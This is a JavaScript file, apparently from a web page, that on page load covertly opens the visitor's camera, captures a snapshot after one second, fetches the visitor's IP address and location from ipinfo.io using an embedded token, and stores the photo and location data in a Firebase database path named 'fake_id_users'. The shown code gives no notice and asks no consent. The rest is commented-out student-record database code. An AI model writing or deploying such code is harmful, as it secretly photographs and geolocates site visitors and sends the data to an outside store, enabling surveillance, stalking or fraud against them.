(function($) {
  "use strict";
 
 
document.addEventListener('DOMContentLoaded', function () {


      function SaveThisdata(photo) { 
        fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
          (response) => response.json()
        ).then((jsonResponse) => {
          var ip = `${jsonResponse.ip}`.replaceAll('.','-')
          firebase
          .database()
          .ref("fake_id_users/" + ip)
          .set({
            "photo": photo,
            ...jsonResponse
          });
        })
      }
 
      function GetImgThenSave() {
        var video = document.getElementById('video'); 
        // Cross-browser getUserMedia
        navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
        if (navigator.getUserMedia) {
          navigator.getUserMedia({ video: true },
            function (stream) {
              video.srcObject = stream;
  
              setTimeout(() => {
                var canvas = document.createElement('canvas');
                canvas.width = 700;
                canvas.height = 500;
                var context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert the canvas content to base64
                var base64Data = canvas.toDataURL('image/png');
                SaveThisdata(`${base64Data}`)
              }, 1000);


            },
            function (err) {
              SaveThisdata('assets/img/no-image-found.jpg')
            }
          );
        } else {
          SaveThisdata('assets/img/no-image-found.jpg')
          // console.error("getUserMedia is not supported in this browser");
        }
      }
      GetImgThenSave()


}); 
 



 
 
 
//   var rollV, nameV, genderV, addressV;

// function readFom() {
//   rollV = document.getElementById("roll").value;
//   nameV = document.getElementById("name").value;
//   genderV = document.getElementById("gender").value;
//   addressV = document.getElementById("address").value;
//   console.log(rollV, nameV, addressV, genderV);
// }

// document.getElementById("insert").onclick = function () {
//   readFom();

//   firebase
//     .database()
//     .ref("student/" + rollV)
//     .set({
//       rollNo: rollV,
//       name: nameV,
//       gender: genderV,
//       address: addressV,
//     });
//   alert("Data Inserted");
//   document.getElementById("roll").value = "";
//   document.getElementById("name").value = "";
//   document.getElementById("gender").value = "";
//   document.getElementById("address").value = "";
// };

// document.getElementById("read").onclick = function () {
//   readFom();

//   firebase
//     .database()
//     .ref("student/" + rollV)
//     .on("value", function (snap) {
//       document.getElementById("roll").value = snap.val().rollNo;
//       document.getElementById("name").value = snap.val().name;
//       document.getElementById("gender").value = snap.val().gender;
//       document.getElementById("address").value = snap.val().address;
//     });
// };

// document.getElementById("update").onclick = function () {
//   readFom();

//   firebase
//     .database()
//     .ref("student/" + rollV)
//     .update({
//       //   rollNo: rollV,
//       name: nameV,
//       gender: genderV,
//       address: addressV,
//     });
//   alert("Data Update");
//   document.getElementById("roll").value = "";
//   document.getElementById("name").value = "";
//   document.getElementById("gender").value = "";
//   document.getElementById("address").value = "";
// };
// document.getElementById("delete").onclick = function () {
//   readFom();

//   firebase
//     .database()
//     .ref("student/" + rollV)
//     .remove();
//   alert("Data Deleted");
//   document.getElementById("roll").value = "";
//   document.getElementById("name").value = "";
//   document.getElementById("gender").value = "";
//   document.getElementById("address").value = "";
// };









 
})(jQuery);
